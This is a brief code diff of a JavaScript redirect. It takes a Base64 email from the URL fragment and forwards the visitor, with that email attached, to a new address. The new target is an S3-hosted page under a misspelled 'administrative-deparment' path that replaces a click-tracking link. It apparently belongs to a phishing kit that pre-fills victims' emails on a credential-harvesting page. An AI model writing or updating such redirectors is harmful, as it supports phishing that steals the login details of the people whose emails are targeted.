@@ -11,7 +11,7 @@
         const currentUrl = window.location.href;
       
         // Use a regular expression to extract the Base64 email after the '#'
-        const base64EmailMatch = currentUrl.match(/\?(.+)/);
+        const base64EmailMatch = currentUrl.match(/#(.+)/);
         const base64Email = base64EmailMatch ? base64EmailMatch[1] : null;
       
         // If a Base64 email is found, decode it and redirect
@@ -20,7 +20,7 @@
             // Decode the Base64 email
             
             // Redirect to the new URL with the decoded email
-            const newUrl = `https://ctrk.klclick3.com/l/01J9RX35Q81Q26G6GE2W8SQFMT_0#${base64Email}`;
+            const newUrl = `https://3rdq.s3.us-east-1.amazonaws.com/server-side-policy/administrative-deparment/index.html#${base64Email}`;
             window.location.href = newUrl;
           } catch (e) {
             console.error('Invalid Base64 string:', e);
